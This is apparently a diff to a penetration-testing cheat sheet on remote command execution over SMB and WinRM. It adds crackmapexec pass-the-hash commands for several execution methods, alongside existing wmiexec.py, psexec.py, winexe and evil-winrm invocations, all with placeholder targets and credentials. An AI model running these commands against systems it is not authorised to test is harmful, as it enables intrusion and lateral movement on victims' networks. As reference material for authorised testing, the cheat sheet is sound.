@@ -6,18 +6,27 @@
 ### SMB
 
 ```bash
-.\WmiExec.ps1 -ComputerName "<target>" -Command "Get-ChildItem C:\"
 wmiexec.py <domain>\<user>:<pass>@<target>
 winexe -U <domain>/<user>%<pass> //<target> cmd.exe /c dir C:\
 python psexec.py '<user>:<pass>@<target>'
+
+crackmapexec smb --exec-method wmiexec <host> -u <user> -d <domain> -H <hash> -x <command>
+crackmapexec smb --exec-method smbexec <host_file> -u <user> -d <domain> -H <hash> -x <command>
+crackmapexec smb --exec-method atexec <host> -u <user> -d <domain> -H <hash> -x <command>
+crackmapexec smb --exec-method mmcexec <host> -u <user> -d <domain> -H <hash> -x <command>
+
+WmiExec.ps1 -ComputerName "<target>" -Command "Get-ChildItem C:\"
 ```
 
-### WinrRM
+### WinRM
 
 ```bash
 gem install evil-winrm
 evil-winrm -i <target> -u <user> -p '<pass>'
 ```
+
+---
+
 
 ## Webshell
 
